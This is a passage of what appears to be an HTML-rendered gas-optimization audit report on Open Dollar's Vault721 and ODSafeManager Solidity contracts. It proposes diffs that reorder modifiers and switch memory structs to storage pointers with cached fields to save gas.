class=\"mtk12\">_safeManager</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_oracleRelayer</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_taxCollector</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_collateralJoinFactory</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">114</span><span class=\"mtk1\">:  }</span></span></span></code></pre>\n<p>Our function makes use of 2 modifers <code>onlyGovernor</code> and <code>nonZero</code>. The modifiers are defined as follows\n<a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/Vault721.sol#L40-L43\">https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/Vault721.sol#L40-L43</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"80\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">40</span><span class=\"mtk1\">:  </span><span class=\"mtk12\">modifier</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyGovernor</span><span class=\"mtk1\">() {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">41</span><span class=\"mtk1\">:    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">governor</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">NotGovernor</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">42</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">43</span><span class=\"mtk1\">:  }</span></span></span></code></pre>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/Vault721.sol#L48-L51\">https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/Vault721.sol#L48-L51</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"81\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">48</span><span class=\"mtk1\">:  </span><span class=\"mtk12\">modifier</span><span class=\"mtk1\"> </span><span class=\"mtk11\">nonZero</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_addr</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">49</span><span class=\"mtk1\">:    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_addr</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ZeroAddress</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">50</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">51</span><span class=\"mtk1\">:  }</span></span></span></code></pre>\n<p>The first modifier <code>onlyGovernor</code> which is also the first one to be executed in our function involves reading a state variable <code>governor</code>, Since this is the first SLOAD we consume 2100 Gas for the SLOAD.\nThe second modifier <code>nonZero</code> does not read any state variable, only parameters being passed to it, in our case , some function parameters.</p>\n<p>According to the docs,multiple modifiers are evaluated in the order presented.</p>\n<p>Due to how they are order in our calling function <code>updateNftRenderer</code> ie\n<code>) external onlyGovernor nonZero(_oracleRelayer) nonZero(_taxCollector) nonZero(_collateralJoinFactory) {</code>\nThe <code>onlyGovernor</code> is checked first and if <code>msg.sender</code> == <code>governor</code> we proceed to check the second modifier <code>nonZero</code> passing our function parameter <code>_oracleRelayer</code> and again proceed to the next or revert if the passed parameter <code>==</code> <code>address(0)</code>.</p>\n<p>In case we do revert on the check <code>nonZero</code> it means, the gas cost used to do the SLOAD in the <code>onlyGovernor</code> check, would be wasted.\nWe can save some gas (2100 Gas) for the SLOAD if we reorder the modifier execution to first check for <code>nonZero</code> and only do <code>onlyGovernor</code> if all our parameters are not <code>zero</code>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"82\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/contracts/proxies/Vault721.sol b/src/contracts/proxies/Vault721.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 54dc8f7..eca21a1 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/contracts/proxies/Vault721.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/contracts/proxies/Vault721.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -106,7 +106,7 @@ contract Vault721 is ERC721Enumerable {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     address _oracleRelayer,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     address _taxCollector,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     address _collateralJoinFactory</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  ) external onlyGovernor nonZero(_oracleRelayer) nonZero(_taxCollector) nonZero(_collateralJoinFactory) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  ) external  nonZero(_oracleRelayer) nonZero(_taxCollector) nonZero(_collateralJoinFactory) onlyGovernor {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     address _safeManager = address(safeManager);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     require(_safeManager != address(0));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     _setNftRenderer(_nftRenderer);</span></span></span></code></pre>\n<h2 id=\"g-06-using-storage-instead-of-memory-for-structsarrays-saves-gas-not-found-by-the-bot\" style=\"position:relative;\"><a href=\"#g-06-using-storage-instead-of-memory-for-structsarrays-saves-gas-not-found-by-the-bot\" aria-label=\"g 06 using storage instead of memory for structsarrays saves gas not found by the bot permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-06] Using storage instead of memory for structs/arrays saves gas (<strong>Not found by the bot</strong>)</h2>\n<h3 id=\"odsafemanagersoltransfersafeownership-use-storage-for-_sdata\" style=\"position:relative;\"><a href=\"#odsafemanagersoltransfersafeownership-use-storage-for-_sdata\" aria-label=\"odsafemanagersoltransfersafeownership use storage for _sdata permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ODSafeManager.sol.transferSAFEOwnership(): Use storage for <code>_sData</code></h3>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L136-L152\">https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L136-L152</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"83\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">proxies</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ODSafeManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">136</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">transferSAFEOwnership</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_dst</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">140</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">SAFEData</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_sData</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_safeData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">141</span><span class=\"mtk1\">:    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_dst</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">_sData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">AlreadySafeOwner</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">143</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">_usrSafes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_sData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">].</span><span class=\"mtk11\">remove</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">144</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">_usrSafesPerCollat</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_sData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_sData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralType</span><span class=\"mtk1\">].</span><span class=\"mtk11\">remove</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">146</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">_usrSafes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_dst</span><span class=\"mtk1\">].</span><span class=\"mtk11\">add</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">147</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">_usrSafesPerCollat</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_dst</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_sData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralType</span><span class=\"mtk1\">].</span><span class=\"mtk11\">add</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">149</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">_safeData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">].</span><span class=\"mtk12\">owner</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_dst</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">151</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">TransferSAFEOwnership</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_dst</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">152</span><span class=\"mtk1\">:  }</span></span></span></code></pre>\n<p>After changing to storage, we cache the fields that are being read several times</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"84\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/contracts/proxies/ODSafeManager.sol b/src/contracts/proxies/ODS</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">afeManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index b3ab2f5..0b2346b 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/contracts/proxies/ODSafeManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/contracts/proxies/ODSafeManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -137,14 +137,16 @@ contract ODSafeManager is IODSafeManager {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     require(msg.sender == address(vault721), &#39;SafeMngr: Only Vault721&#39;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     if (_dst == address(0)) revert ZeroAddress();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    SAFEData memory _sData = _safeData[_safe];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    if (_dst == _sData.owner) revert AlreadySafeOwner();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    SAFEData storage _sData = _safeData[_safe];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    address _owner = _sData.owner;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    if (_dst == _owner) revert AlreadySafeOwner();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    _usrSafes[_sData.owner].remove(_safe);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    _usrSafesPerCollat[_sData.owner][_sData.collateralType].remove(_safe);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    _usrSafes[_owner].remove(_safe);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    bytes32 _collateralType = _sData.collateralType;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    _usrSafesPerCollat[_owner][_collateralType].remove(_safe);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     _usrSafes[_dst].add(_safe);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    _usrSafesPerCollat[_dst][_sData.collateralType].add(_safe);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    _usrSafesPerCollat[_dst][_collateralType].add(_safe);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+     _sData.owner = _dst;</span></span></span></code></pre>\n<h3 id=\"odsafemanagersolmodifysafecollateralization-use-storage-for-_sdata-and-cache-fields-being-called-repeatedly\" style=\"position:relative;\"><a href=\"#odsafemanagersolmodifysafecollateralization-use-storage-for-_sdata-and-cache-fields-being-called-repeatedly\" aria-label=\"odsafemanagersolmodifysafecollateralization use storage for _sdata and cache fields being called repeatedly permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ODSafeManager.sol.modifySAFECollateralization(): Use storage for <code>_sData</code> and cache fields being called repeatedly</h3>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L155-L165\">https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L155-L165</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"85\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">proxies</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ODSafeManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">155</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">modifySAFECollateralization</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">156:    </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_safe</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">157:    </span><span class=\"mtk10\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_deltaCollateral</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">158:    </span><span class=\"mtk10\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_deltaDebt</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">159</span><span class=\"mtk1\">:  ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">safeAllowed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">160</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">SAFEData</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_sData</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_safeData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">161</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">ISAFEEngine</span><span class=\"mtk1\">(</span><span class=\"mtk12\">safeEngine</span><span class=\"mtk1\">).</span><span class=\"mtk11\">modifySAFECollateralization</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">162</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">_sData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralType</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_sData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">safeHandler</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_sData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">safeHandler</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_sData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">safeHandler</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_deltaCollateral</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_deltaDebt</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">163</span><span class=\"mtk1\">:    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">164</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ModifySAFECollateralization</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_deltaCollateral</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_deltaDebt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">165</span><span class=\"mtk1\">: }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"86\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/contracts/proxies/ODSafeManager.sol b/src/contracts/proxies/ODS</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">afeManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index b3ab2f5..4d6e7ab 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/contracts/proxies/ODSafeManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/contracts/proxies/ODSafeManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -157,9 +157,10 @@ contract ODSafeManager is IODSafeManager {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     int256 _deltaCollateral,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     int256 _deltaDebt</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   ) external safeAllowed(_safe) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    SAFEData memory _sData = _safeData[_safe];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    SAFEData storage _sData = _safeData[_safe];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    address _safeHandler = _sData.safeHandler;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ISAFEEngine(safeEngine).modifySAFECollateralization(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      _sData.collateralType, _sData.safeHandler, _sData.safeHandler, _sData.safeHandler, _deltaCollateral, _deltaDebt</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      _sData.collateralType, _safeHandler, _safeHandler, _safeHandler, _deltaCollateral, _deltaDebt</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     emit ModifySAFECollateralization(msg.sender, _safe, _deltaCollateral, _deltaDebt);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   }</span></span></span></code></pre>\n<h3 id=\"odsafemanagersoltransfercollateral-use-storage-for-_sdata\" style=\"position:relative;\"><a href=\"#odsafemanagersoltransfercollateral-use-storage-for-_sdata\" aria-label=\"odsafemanagersoltransfercollateral use storage for _sdata permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ODSafeManager.sol.transferCollateral(): Use storage for <code>_sData</code></h3>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L168-L172\">https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L168-L172</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"87\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">proxies</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ODSafeManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">168</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">transferCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_dst</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_wad</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">safeAllowed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_safe</span><span 